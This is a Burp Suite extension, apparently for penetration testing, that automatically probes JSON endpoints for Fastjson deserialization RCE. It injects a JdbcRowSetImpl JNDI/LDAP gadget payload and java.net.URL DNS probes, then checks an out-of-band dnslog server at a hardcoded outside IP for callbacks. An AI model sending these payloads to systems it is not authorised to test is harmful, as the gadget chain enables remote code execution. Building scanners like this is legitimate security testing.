# -*-coding:utf-8 -*-
# 被动扫描fastjson rce检测
from burp import IBurpExtender, IScannerCheck, IScanIssue, IMessageEditorTabFactory, IContextMenuFactory
from burp import IScanIssue
import sys
import time
import os
import requests
import random

headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36"}




# 获取随机值
def get_random_str():
    str1 = ""
    for i in range(8):
        str1 += (random.choice("QWERTYUIOPASDFGHJKLZXCVBNM1234567890"))
    return str(str1)

# 获取dnslog地址
def get_dnslog():
    flag = True
    getdomain_url = r'http://47.244.138.18/getdomain.php'
    while flag:
        try:
            res = requests.get(url=getdomain_url, headers=headers)
            cookies = res.cookies
            dnslog_domain = res.text  # dnslog地址
            for cookie in cookies:
                name, value = cookie.name, cookie.value
                if name == 'PHPSESSID':
                    getrecords_cookie = {}
                    getrecords_cookie[name] = value  # 刷新dnslog所需要的cookies
                    return getrecords_cookie, dnslog_domain
        except Exception as e:
            print(e.args)
            print('dnslog Address acquisition failed, please re-run the script')  # dnslog地址获取失败，请重新运行脚本


# 刷新dnslog，查看是否有数据
def records_dnslog(random_str, getrecords_cookie):
    getrecords_url = r'http://47.244.138.18/getrecords.php'
    res = requests.get(url=getrecords_url, cookies=getrecords_cookie, headers=headers)
    if random_str in res.text:
        return True
    else:
        return False


class BurpExtender(IBurpExtender, IMessageEditorTabFactory, IContextMenuFactory, IScannerCheck):
    def registerExtenderCallbacks(self, callbacks):

        # Required for easier debugging:
        sys.stdout = callbacks.getStdout()

        # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。。
        self._callbacks = callbacks

        # 用于获取IExtensionHelpers对象，扩展可以使用该对象执行许多有用的任务。返回：包含许多帮助器方法的对象，用于构建和分析HTTP请求等任务。
        self._helpers = callbacks.getHelpers()

        # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。
        self._callbacks.setExtensionName("Passive Fastjson Check")

        # 注册扫描
        callbacks.registerScannerCheck(self)

        print 'Load successful - auther:ske\n'

    # 获取请求的url
    def get_request_url(self, protocol, reqHeaders):
        link = reqHeaders[0].split(' ')[1]
        host = reqHeaders[1].split(' ')[1]
        return protocol + '://' + host + link

    # 获取请求的一些信息：请求头，请求内容，请求方法，请求参数
    def get_request_info(self, request):
        analyzedIRequestInfo = self._helpers.analyzeRequest(request)  # analyzeRequest用于分析HTTP请求，并获取有关它的各种关键详细信息。生成的IRequestInfo对象
        reqHeaders = analyzedIRequestInfo.getHeaders()  # 用于获取请求中包含的HTTP头。返回：请求中包含的HTTP标头。
        reqBodys = request[analyzedIRequestInfo.getBodyOffset():].tostring()  # 获取消息正文开始的请求中的偏移量。返回：消息正文开始的请求中的偏移量。
        reqMethod = analyzedIRequestInfo.getMethod()  # 获取请求方法
        reqParameters = analyzedIRequestInfo.getParameters()
        return analyzedIRequestInfo, reqHeaders, reqBodys, reqMethod, reqParameters

    # 获取响应的一些信息：响应头，响应内容，响应状态码
    def get_response_info(self, response):
        analyzedIResponseInfo = self._helpers.analyzeRequest(response)  # analyzeResponse方法可用于分析HTTP响应，并获取有关它的各种关键详细信息。返回：IResponseInfo可以查询的对象以获取有关响应的详细信息。
        resHeaders = analyzedIResponseInfo.getHeaders()  # getHeaders方法用于获取响应中包含的HTTP标头。返回：响应中包含的HTTP标头。
        resBodys = response[analyzedIResponseInfo.getBodyOffset():].tostring()  # getBodyOffset方法用于获取消息正文开始的响应中的偏移量。返回：消息正文开始的响应中的偏移量。response[analyzedResponse.getBodyOffset():]获取正文内容
        # resStatusCode = analyzedIResponseInfo.getStatusCode()  # getStatusCode获取响应中包含的HTTP状态代码。返回：响应中包含的HTTP状态代码。
        return resHeaders, resBodys

    # 获取服务端的信息，主机地址，端口，协议
    def get_server_info(self, httpService):
        host = httpService.getHost()
        port = httpService.getPort()
        protocol = httpService.getProtocol()
        ishttps = False
        if protocol == 'https':
            ishttps = True
        return host, port, protocol, ishttps

    # 获取请求的参数名、参数值、参数类型（get、post、cookie->用来构造参数时使用）
    def get_parameter_Name_Value_Type(self, parameter):
        parameterName = parameter.getName()
        parameterValue = parameter.getValue()
        parameterType = parameter.getType()
        return parameterName, parameterValue, parameterType

    # 保存fastjson rce
    def save(self, content):
        with open('isFastjsonRCE.txt', 'at') as f:
            f.writelines('{}\n'.format(content))

    # 保存检测过的数据包
    def save_checked(self, json_data):
        with open('fastjsonChecked.txt', 'at') as f:
            f.writelines('{}\n'.format(str(json_data)))

    # 判断是否检测过
    def isNotCheck(self, json_data):
        # 如果sqlChecked文件不存在，说明是第一次执行插件，那么肯定没有被检测过
        if not os.path.exists('fastjsonChecked.txt'):
            return True

        with open('fastjsonChecked.txt', 'rt') as f:
            if str(json_data) + '\n' in f.readlines():      # 有记录，认为该数据包检测过
                return False
            else:
                return True

    def sen_payloads(self, reqUrl, reqHeaders, httpService):
        def payloads1():
            random_str = get_random_str()  # 获取随机值
            dnslog_random_domain = random_str + '.' + dnslog_domain  # dnslog的随机子域名

            payload1 = '{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://' + dnslog_random_domain + '/Exploit","autoCommit":true}}}'
            newBody = self._helpers.stringToBytes(payload1)  # 将字符串转换为字节 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#stringToBytes(java.lang.String)
            newRequest = self._helpers.buildHttpMessage(reqHeaders, newBody)  # 重构json格式的数据不能用buildParameter，要用buildHttpMessage替换整个body重构http消息。 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#buildHttpMessage(java.util.List,%20byte[])
            newIHttpRequestResponse = self._callbacks.makeHttpRequest(httpService, newRequest)  # 发送数据
            # response = newIHttpRequestResponse.getResponse()  # 获取响应包
            # analyzedIResponseInfo = self._helpers.analyzeRequest(response)  # analyzeResponse方法可用于分析HTTP响应，并获取有关它的各种关键详细信息。返回：IResponseInfo可以查询的对象以获取有关响应的详细信息。
            # resBodys = response[analyzedIResponseInfo.getBodyOffset():].tostring()
            newUrl = self._helpers.analyzeRequest(newIHttpRequestResponse).getUrl()

            time.sleep(5)  # 等十秒再查询，可能会有延迟
            if records_dnslog(random_str, getrecords_cookie):
                print '[+] {}'.format(newUrl)
                self.save(newUrl)
                self.issues.append(CustomScanIssue(
                    newIHttpRequestResponse.getHttpService(),
                    newUrl,
                    [newIHttpRequestResponse],
                    "FastJson RCE",
                    "dnslog.cn PHPSESSID={}".format(getrecords_cookie),
                    "High"))
            else:
                print '[-] {}'.format(reqUrl)

        def payloads2():
            random_str = get_random_str()  # 获取随机值
            dnslog_random_domain = random_str + '.' + dnslog_domain  # dnslog的随机子域名
            payload2_a = '"a":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://' + dnslog_random_domain + '"}}""},\n'
            payload2_b = '"b":{{"@type":"java.net.URL","val":"http://' + dnslog_random_domain + '"}:"x"},\n'
            payload2_c = '"c":{{"@type":"java.net.URL","val":"http://' + dnslog_random_domain + '"}:0,\n'
            payload2_d = '"d":Set[{"@type":"java.net.URL","val":"http://' + dnslog_random_domain + '"}],\n'
            payload2_e = '"e":Set[{"@type":"java.net.URL","val":"http://' + dnslog_random_domain + '"},\n'
            payload2 = '{\n' + payload2_a + payload2_b + payload2_c + payload2_d + payload2_e + '}'

            newBody = self._helpers.stringToBytes(payload2)  # 将字符串转换为字节 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#stringToBytes(java.lang.String)
            newRequest = self._helpers.buildHttpMessage(reqHeaders, newBody)  # 重构json格式的数据不能用buildParameter，要用buildHttpMessage替换整个body重构http消息。 https://portswigger.net/burp/extender/api/burp/IExtensionHelpers.html#buildHttpMessage(java.util.List,%20byte[])
            newIHttpRequestResponse = self._callbacks.makeHttpRequest(httpService, newRequest)  # 发送数据
            newUrl = self._helpers.analyzeRequest(newIHttpRequestResponse).getUrl()

            time.sleep(5)  # 等十秒再查询，可能会有延迟
            if records_dnslog(random_str, getrecords_cookie):
                print '[+] {}'.format(newUrl)
                self.save(newUrl)
                self.issues.append(CustomScanIssue(
                    newIHttpRequestResponse.getHttpService(),
                    newUrl,
                    [newIHttpRequestResponse],
                    "FastJson RCE",
                    "dnslog.cn PHPSESSID={}".format(getrecords_cookie),
                    "High"))
            else:
                print '[-] {}'.format(reqUrl)

        getrecords_cookie, dnslog_domain = get_dnslog()  # 从dnslog获取域名和cookies

        payloads1()
        payloads2()




    # 开始检测
    def start_run(self, baseRequestResponse):
        self.baseRequestResponse = baseRequestResponse

        # 获取请求包的数据
        request = self.baseRequestResponse.getRequest()
        analyzedRequest, reqHeaders, reqBodys, reqMethod, reqParameters = self.get_request_info(request)
        reqContentType = analyzedRequest.getContentType()       # 获取请求格式，例如json


        if reqContentType == 4:         # json格式数据

            # 获取服务信息
            httpService = self.baseRequestResponse.getHttpService()
            host, port, protocol, ishttps = self.get_server_info(httpService)

            # 获取请求的url
            reqUrl = self.get_request_url(protocol, reqHeaders)
            print 'check {}'.format(reqUrl)
            # 通过url，方法，参数 -> 识别数据包是否检测过
            json_data = {"url": reqUrl}
            if not self.isNotCheck(json_data):
                print '[checked] {}'.format(reqUrl)
                return True
            self.save_checked(json_data)




            self.sen_payloads(reqUrl, reqHeaders, httpService)








    def doPassiveScan(self, baseRequestResponse):
        '''
        :param baseRequestResponse: IHttpRequestResponse
        :return:
        '''
        self.issues = []
        self.start_run(baseRequestResponse)
        return self.issues


    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        '''
        相同的数据包，只报告一份报告
        :param existingIssue:
        :param newIssue:
        :return:
        '''

        if existingIssue.getIssueDetail() == newIssue.getIssueDetail():
            return -1

        return 0


class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        '''

        :param httpService: HTTP服务
        :param url: 漏洞url
        :param httpMessages: HTTP消息
        :param name: 漏洞名
        :param detail: 漏洞细节
        :param severity: 漏洞等级
        '''
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        pass

    def getRemediationBackground(self):
        pass

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        pass

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService